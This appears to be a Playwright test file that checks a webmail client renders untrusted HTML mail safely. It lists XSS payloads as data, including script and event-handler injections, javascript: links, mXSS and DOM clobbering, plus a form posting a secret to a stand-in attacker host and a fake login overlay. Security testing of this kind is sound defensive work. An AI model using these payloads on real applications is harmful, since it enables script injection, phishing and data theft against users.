// HTML mail is untrusted input. Each payload below tries to run script, leave
// the message area, navigate the app, or phone home. None may succeed, the
// app UI must stay intact, and the page guard (fixtures.ts) fails the test on
// any console error, e.g. a CSP violation.
import { test, expect } from './fixtures'
import { appendRaw, openMessage, pwned, rawMessage } from './helpers-reading'

const PAYLOADS: Record<string, string> = {
  script: '<p>script</p><script>window.__pwned = "script"; document.title = "PWNED"</script>',
  onerror: '<img src="x" onerror="window.__pwned=\'onerror\'"><img src="data:image/gif;base64,R0lGOD" onerror="window.__pwned=\'onerror2\'">',
  'javascript link': '<a id="jl" href="javascript:window.__pwned=\'js-link\'">click me</a> <a href="  JaVaScRiPt:window.__pwned=1">two</a> <a href="jav&#x09;ascript:window.__pwned=1">three</a>',
  iframe: '<iframe src="javascript:parent.__pwned=\'iframe\'"></iframe><iframe srcdoc="<script>parent.__pwned=\'srcdoc\'</script>"></iframe>',
  'svg onload': '<svg onload="window.__pwned=\'svg\'"><circle r="5"/></svg><svg><script>window.__pwned="svgscript"</script></svg>',
  'math/mXSS': '<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned=\'mxss\'">',
  'object/embed': '<object data="javascript:window.__pwned=1"></object><embed src="javascript:window.__pwned=1">',
  'event attrs': '<div onmouseover="window.__pwned=\'hover\'" onclick="window.__pwned=\'click\'">hover target</div><body onload="window.__pwned=\'body\'">',
  'meta refresh': '<meta http-equiv="refresh" content="0;url=javascript:window.__pwned=1"><meta http-equiv="refresh" content="1;url=https://evil.example.test/">',
  'base href': '<base href="https://evil.example.test/"><a href="relative">rel</a>',
  form: '<form action="https://evil.example.test/steal" method="post"><input name="p" value="secret"><button id="sub">Submit</button></form>',
  'css expression': '<div style="width: expression(window.__pwned=1); background: url(javascript:window.__pwned=1)">css</div>',
  'link stylesheet': '<link rel="stylesheet" href="https://evil.example.test/x.css"><link rel="import" href="https://evil.example.test/x.html">',
  'data uri': '<a href="data:text/html,<script>alert(1)</script>">data link</a><iframe src="data:text/html,<script>parent.__pwned=1</script>"></iframe>',
  'tracking pixel': '<img src="https://track.example.test/p.gif?u=1" width="1" height="1"><img src="//track.example.test/p2.gif"><div style="background-image:url(https://track.example.test/bg.gif)">bg</div><table background="https://track.example.test/t.gif"><tr><td>t</td></tr></table>',
  'dom clobbering': '<form name="getElementById"></form><img name="cookie"><a id="__pwned" href="https://x.example.test/">clobber</a>'
}

test.describe('XSS payloads in HTML mail', () => {
  for (const [name, html] of Object.entries(PAYLOADS)) {
    test(`does not execute: ${name}`, async ({ mailbox, app }) => {
      const external: string[] = []
      await app.route(/evil\.example\.test|track\.example\.test|x\.example\.test/, (r) => { external.push(r.request().url()); return r.abort() })
      const subject = `XSS ${name}`
      await mailbox.seed('INBOX', [{ subject, html: `<div>Payload ${name}</div>${html}<p>after payload</p>` }])
      const content = await openMessage(app, subject)
      await expect(content).toContainText(`Payload ${name}`)
      // Try to trigger interaction-based payloads.
      await content.hover().catch(() => {})
      const hover = content.getByText('hover target')
      if (await hover.count()) { await hover.hover(); await hover.click() }
      await app.waitForTimeout(800)
      expect(await pwned(app)).toBeUndefined()
      await expect(app).toHaveTitle('Leoposta')
      expect(app.url()).not.toContain('evil.example.test')
      expect(external, 'no request to a remote host before "Load images"').toEqual([])
      // Nothing dangerous survived into the DOM.
      const dangerous = await content.evaluate((el) => {
        const bad: string[] = []
        el.querySelectorAll('script,iframe,object,embed,form,input,meta,base,link,style,svg,math').forEach((n) => bad.push(n.tagName))
        el.querySelectorAll('*').forEach((n) => {
          for (const a of Array.from(n.attributes)) {
            if (/^on/i.test(a.name)) bad.push(`${n.tagName}[${a.name}]`)
            if (/^(id|name)$/i.test(a.name)) bad.push(`${n.tagName}[${a.name}]`)
            if (/^\s*(javascript|data|vbscript):/i.test(a.value) && !(n.tagName === 'IMG' && /^data:image\//i.test(a.value))) bad.push(`${n.tagName}[${a.name}=${a.value}]`)
          }
        })
        return bad
      })
      expect(dangerous).toEqual([])
      // The app chrome still works.
      await expect(app.locator('.sidebar')).toBeVisible()
      await expect(app.getByRole('button', { name: 'Reply', exact: true })).toBeVisible()
    })
  }

  test('links open in a new tab with noopener and never navigate the app', async ({ mailbox, app, context }) => {
    await context.route('https://dest.example.test/**', (r) => r.fulfill({ status: 200, body: 'dest', contentType: 'text/plain' }))
    await mailbox.seed('INBOX', [{ subject: 'Link mail', html: '<p><a href="https://dest.example.test/page" target="_self">same-tab link</a> <a href="https://dest.example.test/two" target="_top">top</a> <a href="mailto:x@example.test">mail</a></p>' }])
    const content = await openMessage(app, 'Link mail')
    for (const a of await content.locator('a[href^="https:"]').all()) {
      await expect(a).toHaveAttribute('target', '_blank')
      await expect(a).toHaveAttribute('rel', /noopener/)
      await expect(a).toHaveAttribute('rel', /noreferrer/)
    }
    const [popup] = await Promise.all([context.waitForEvent('page'), content.getByText('same-tab link').click()])
    await popup.waitForLoadState()
    expect(popup.url()).toBe('https://dest.example.test/page')
    expect(await popup.evaluate(() => window.opener)).toBeNull()
    await popup.close()
    expect(new URL(app.url()).hostname).toBe('127.0.0.1')
    await expect(app.locator('.sidebar')).toBeVisible()
  })

  test('inline styles cannot cover or restyle the app outside the message', async ({ mailbox, app }) => {
    await mailbox.seed('INBOX', [{
      subject: 'Overlay attack',
      html: '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647;background:red">FAKE LOGIN OVERLAY</div>' +
        '<div style="position:absolute;top:-500px;left:-500px;width:3000px;height:3000px;background:blue">abs</div>' +
        '<style>.sidebar{display:none !important} body{background:red !important}</style><p>styled</p>'
    }])
    await openMessage(app, 'Overlay attack')
    await expect(app.locator('.sidebar')).toBeVisible()
    // The sidebar and the Reply button are still the topmost elements at their position.
    for (const loc of [app.locator('.sidebar'), app.getByRole('button', { name: 'Reply', exact: true })]) {
      const top = await loc.evaluate((el) => {
        const r = el.getBoundingClientRect()
        const hit = document.elementFromPoint(r.left + r.width / 2, r.top + Math.min(r.height / 2, 20))
        return !!hit && (el === hit || el.contains(hit))
      })
      expect(top).toBe(true)
    }
    const bodyBg = await app.evaluate(() => getComputedStyle(document.body).backgroundColor)
    expect(bodyBg).not.toBe('rgb(255, 0, 0)')
  })

  test('a text/html part with a broken charset and a raw script is still inert', async ({ mailbox, user, app }) => {
    await appendRaw(mailbox, 'INBOX', [rawMessage({
      self: user, subject: 'Raw html no type',
      headers: ['Content-Type: text/html; charset=x-unknown-charset'],
      body: '<html><body><p>raw html</p><img src=x onerror="window.__pwned=1"><script>window.__pwned=2</script></body></html>'
    })])
    const content = await openMessage(app, 'Raw html no type')
    await expect(content).toContainText('raw html')
    await app.waitForTimeout(500)
    expect(await pwned(app)).toBeUndefined()
  })

  test('the sender name and subject are rendered as text, not HTML', async ({ mailbox, user, app }) => {
    await appendRaw(mailbox, 'INBOX', [rawMessage({
      self: user,
      from: '"<img src=x onerror=window.__pwned=1>" <evil@example.test>',
      subject: '<script>window.__pwned=1</script><b>bold?</b>',
      body: 'plain <script>window.__pwned=3</script>'
    })])
    await openMessage(app, /bold\?/)
    await expect(app.locator('.message-view .message-subject')).toHaveText('<script>window.__pwned=1</script><b>bold?</b>')
    await expect(app.locator('.message-view .plain-body')).toContainText('plain <script>')
    await app.waitForTimeout(500)
    expect(await pwned(app)).toBeUndefined()
  })
})
